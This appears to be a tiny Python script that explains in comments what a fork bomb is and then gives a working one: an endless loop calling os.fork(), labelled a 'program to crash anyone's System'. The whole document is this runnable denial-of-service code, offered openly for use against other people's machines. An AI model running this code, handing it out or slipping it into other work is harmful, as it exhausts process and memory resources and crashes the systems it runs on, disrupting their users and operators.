# In computing, a fork bomb (also called rabbit virus or wabbit) is a denial-of-service attack 
# wherein a process continually replicates itself to deplete available system resources, 
# slowing down or crashing the system due to resource starvation. 

#Fork Bomb program to crash anyone's System.

import os
while(1):
  os.fork()
